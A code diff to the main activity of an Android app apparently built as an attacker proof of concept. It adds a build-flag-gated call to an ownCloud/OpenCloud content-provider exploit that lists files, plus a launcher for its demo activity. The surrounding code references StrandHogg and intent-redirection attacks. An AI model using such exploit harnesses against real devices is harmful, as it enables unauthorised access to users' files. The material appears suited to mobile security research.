@@ -19,6 +19,8 @@ import android.os.Process;
 import android.provider.Settings;
 import android.util.Log;
 
+import com.attacker.app.opencloud.OwncloudProviderExploit;
+import com.attacker.app.opencloud.OwncloudProviderExploitActivity;
 import com.attacker.app.service.AttackerService;
 import com.attacker.app.strandhogg.DistractionActivity;
 import com.attacker.app.strandhogg.MaliciousActivity;
@@ -55,11 +57,22 @@ public class MainActivity extends AppCompatActivity {
         if(BuildConfig.INSECURE_TARGET_GRANT_URI_PERMISSIONS_EXPLOIT){
             exploitTempAccessDb();
         }
-
         if(BuildConfig.INTENT_REDIRECTION_EXPLOIT_EXPLORATION){
             exploitIntentRedirection();
         }
 
+        // Exploit OpenCloud CVE
+        if(BuildConfig.OPENCLOUD_FILELIST_EXPLOIT){
+            try {
+                String result = OwncloudProviderExploit.exploit(this, "fileName", "filelist");
+                Log.i(TAG, "OwncloudProvider Exploit Result: " + result);
+            } catch (Exception e) {
+                Log.e(TAG, "Error executing Owncloud FileList exploit", e);
+            }
+        }
+        if(BuildConfig.OPENCLOUD_FILELIST_EXPLOUT_POC){
+            startActivity(new Intent(this, OwncloudProviderExploitActivity.class));
+        }
 
     }
 
